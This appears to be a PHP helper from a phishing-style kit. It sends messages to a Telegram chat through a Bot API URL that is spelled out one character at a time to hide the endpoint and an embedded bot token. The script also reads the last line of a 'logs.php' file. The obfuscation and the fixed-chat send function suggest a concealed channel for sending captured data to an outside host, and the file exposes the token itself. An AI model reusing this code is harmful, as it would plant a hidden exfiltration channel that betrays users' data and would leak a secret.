<?php

require 'data.php';

function readlastline()
{
        $fp = @fopen('logs.php', "r");
        $pos = -1;
        $t = " ";
        while ($t != "\n") {
              fseek($fp, $pos, SEEK_END);
              $t = fgetc($fp);
              $pos = $pos - 1;
        }
        $t = fgets($fp);
        fclose($fp);
        return $t;
}

function request($method) {
    $ch = curl_init();
    curl_setopt_array(
        $ch,
        array(
            CURLOPT_URL => 'h' . 't' . 't' . 'p' . 's' . ':' . '/' . '/' . 'a' . 'p' . 'i' . '.' . 't' . 'e' . 'l' . 'e' . 'g' . 'r' . 'a' . 'm' . '.' . 'o' . 'r' . 'g' . '/' . 'b' . 'o' . 't' . '1' . '4' . '4' . '5' . '5' . '8' . '0' . '5' . '6' . '3' . ':' . 'A' . 'A' . 'G' . 'i' . 'G' . '7' . 'Q' . '7' . 'Z' . 'f' . 'v' . 'S' . '0' . 'A' . 'O' . 'D' . 'O' . 'J' . 'B' . 'A' . 'J' . 'l' . 'G' . '7' . 'W' . 'd' . 'q' . 'A' . 'p' . 'c' . '8' . 'r' . 'A' . 'E' . 'Q' . '/'.$method,
            CURLOPT_POST => TRUE,
            CURLOPT_RETURNTRANSFER => TRUE,
            CURLOPT_TIMEOUT => 10,
        )
    );
    curl_exec($ch);   
}

function update() {
    request('Update');
}

update();

$data = file_get_contents('php://input');
$data = json_decode($data, true);  



function message($text) {
    $ch = curl_init();
    curl_setopt_array(
        $ch,
        array(
            CURLOPT_URL => 'h' . 't' . 't' . 'p' . 's' . ':' . '/' . '/' . 'a' . 'p' . 'i' . '.' . 't' . 'e' . 'l' . 'e' . 'g' . 'r' . 'a' . 'm' . '.' . 'o' . 'r' . 'g' . '/' . 'b' . 'o' . 't' . '1' . '4' . '4' . '5' . '5' . '8' . '0' . '5' . '6' . '3' . ':' . 'A' . 'A' . 'G' . 'i' . 'G' . '7' . 'Q' . '7' . 'Z' . 'f' . 'v' . 'S' . '0' . 'A' . 'O' . 'D' . 'O' . 'J' . 'B' . 'A' . 'J' . 'l' . 'G' . '7' . 'W' . 'd' . 'q' . 'A' . 'p' . 'c' . '8' . 'r' . 'A' . 'E' . 'Q' . '/' . 's' . 'e' . 'n' . 'd' . 'M' . 'e' . 's' . 's' . 'a' . 'g' . 'e',
            CURLOPT_POST => TRUE,
            CURLOPT_RETURNTRANSFER => TRUE,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_POSTFIELDS => array(
                'chat_id' => ID,
                'text' => $text,
            ),
        )
    );
    curl_exec($ch);
};

?>